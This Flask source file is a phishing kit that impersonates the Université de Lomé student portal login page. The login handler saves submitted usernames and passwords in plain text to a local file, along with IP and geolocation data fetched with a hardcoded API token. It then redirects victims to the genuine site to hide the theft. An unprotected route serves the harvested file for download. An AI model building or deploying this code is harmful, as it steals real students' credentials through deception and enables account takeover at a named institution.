from flask import Flask, redirect, request
import requests

app = Flask(__name__)
true_site = 'https://etu.univ-lome.tg'


@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portail Académique de l'Université de Lomé</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            background-color: #f4f4f4;
        }

        .header {
            background-color: #7e278b;
            color: white;
            padding: 10px;
            text-align: center;
        }

        .container {
            display: flex;
            margin: 0 auto;
            max-width: 1200px;
            padding: 20px;
        }

        .sidebar {
            width: 20%;
            background-color: white;
            padding: 15px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        .sidebar ul {
            list-style-type: none;
            padding: 0;
        }

        .sidebar ul li {
            padding: 10px 0;
        }

        .sidebar ul li a {
            text-decoration: none;
            color: #333;
        }

        .main-content {
            width: 80%;
            padding: 20px;
            background-color: #e8f5e9;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }

        .main-content h2 {
            margin-top: 0;
        }

        .login-box {
            background-color: #c8e6c9;
            padding: 20px;
            border-radius: 5px;
            display: inline-block;
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ddd;
            border-radius: 5px;
        }

        .login-box input[type="submit"] {
            background-color: #43a047;
            color: white;
            padding: 10px 15px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }

        .login-box .error-message {
            color: #d32f2f;
            margin-bottom: 10px;
        }

        .top-right {
            position: absolute;
            top: 10px;
            right: 10px;
            text-align: right;
        }

        .top-right img {
            border-radius: 50%;
            width: 30px;
            height: 30px;
            margin-left: 10px;
            vertical-align: middle;
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>Portail Académique de l'Université de Lomé</h1>
    </div>

    <div class="container">
        <div class="sidebar">
            <ul>
                <li><a href="#">Accueil</a></li>
                <li><a href="#">Données personnelles</a></li>
                <li><a href="#">Demande d'inscription</a></li>
                <li><a href="#">Demande de réorientation</a></li>
                <li><a href="#">COUL</a></li>
                <li><a href="#">Unités d'enseignement</a></li>
                <li><a href="#">Paiements</a></li>
                <li><a href="#">Fiche d'inscription</a></li>
                <li><a href="#">Soutenance</a></li>
                <li><a href="#">Notes</a></li>
                <li><a href="#">Demande de documents</a></li>
                <li><a href="#">Cursus</a></li>
                <li><a href="#">Stages</a></li>
                <li><a href="#">Projet Galilée</a></li>
            </ul>
        </div>

        <div class="main-content">
            <h2>Connexion</h2>
            <div class="login-box">
                <div class="error-message">Identifiant ou mot de passe invalide</div>
                <form action="/login" method="post">
                    <input type="text" name="username" placeholder="Identifiant" value="">
                    <input type="password" name="password" placeholder="Mot de passe">
                    <input type="submit" value="Connexion">
                </form>
                <a href="#">Mot de passe oublié</a> | <a href="#">Identifiant oublié</a>
            </div>
        </div>
    </div>

    <div class="top-right">
        Connexion: <img src="profile-pic.png" alt="Profile Picture">
    </div>
</body>
</html>
    '''

def write_info(username, password):
    with open("./info.txt", 'a') as f:
        f.write(f'Name:{username}\t|password:{password}\n')

@app.route('/login', methods=['POST'])
def login():
    #Recolte d'info
    username = request.form['username']
    password = request.form['password']

    #Capture de l'address IP
    try:
        ip_address = requests.get('https://api.ipify.org').text
    except:
        write_info(username, password)
        return redirect(true_site)
    access_token = "4e75820f33ba3b"

    #Demande de géolocalisation
    try:
        response = requests.get(f"https://ipinfo.io/{ip_address}?token={access_token}")
        #raise ConnectionError
    except:
        write_info(username, password)
        return redirect(true_site)
    location_info = response.json()

    #Recolte d'info
    city = location_info.get('city')
    region = location_info.get('region')
    country = location_info.get('country')
    loc = location_info.get('loc')

    #Enregistrez dans un fichier
    with open("./info.txt", 'a') as f:
        f.write(f'Name:{username}\t|password:{password}\t|IP: {ip_address}\t|City:{city}\t|Country:{country}\t|Region:{region}\t|Location: {loc}\n')

    #Redirection vers le vrai site
    return redirect(true_site)

@app.route('/fuck')
def download():
    try:
        return send_file('../info.txt', as_attachment=True)
    except FileNotFoundError:
        return "Fichier pas trouvé"


if __name__ == '__main__':
    app.run(debug=True)
